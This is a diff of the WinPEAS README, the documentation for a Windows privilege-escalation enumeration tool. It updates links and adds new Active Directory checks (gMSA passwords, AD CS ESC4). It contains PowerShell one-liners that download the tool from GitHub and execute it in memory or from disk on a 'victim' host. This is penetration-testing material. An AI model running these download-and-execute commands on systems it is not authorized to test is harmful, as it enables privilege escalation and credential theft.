@@ -2,9 +2,9 @@
 
 ![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)
 
-**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)**
+**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**
 
-Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)**
+Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**
 
 [![youtube](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/screen.png)](https://youtu.be/66gOwXMnxRI)
 
@@ -22,9 +22,14 @@ $url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany
 # One liner to download and execute winPEASany from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
-# Before cmd in 3 lines
+# The previous cmd in 2 lines
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+# Download to disk and execute (super noisy)
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile("https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe", "winPEASany_ofs.exe")
+.\winPEASany_ofs.exe
 
 # Load from disk in memory and execute:
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
@@ -69,9 +74,22 @@ winpeas.exe -lolbas  #Execute also additional LOLBAS search check
 
 The goal of this project is to search for possible **Privilege Escalation Paths** in Windows environments.
 
+New in this version:
+- Detect potential GPO abuse by flagging writable SYSVOL paths for GPOs applied to the current host and by highlighting membership in the "Group Policy Creator Owners" group.
+
+
 It should take only a **few seconds** to execute almost all the checks and **some seconds/minutes during the lasts checks searching for known filenames** that could contain passwords (the time depened on the number of files in your home folder). By default only **some** filenames that could contain credentials are searched, you can use the **searchall** parameter to search all the list (this could will add some minutes).
 
 The tool is based on **[SeatBelt](https://github.com/GhostPack/Seatbelt)**.
+
+### New (AD-aware) checks
+
+- Active Directory quick checks now include:
+  - gMSA readable managed passwords: enumerate msDS-GroupManagedServiceAccount objects and report those where the current user/group is allowed to retrieve the managed password (PrincipalsAllowedToRetrieveManagedPassword).
+  - AD CS (ESC4) hygiene: enumerate published certificate templates and highlight templates where the current user/group has dangerous control rights (GenericAll/WriteDacl/WriteOwner/WriteProperty/ExtendedRight) that could allow template abuse (e.g., ESC4 -> ESC1).
+
+These checks are lightweight, read-only, and only run when the host is domain-joined.
+
 
 ## Where are my COLORS?!?!?!
 
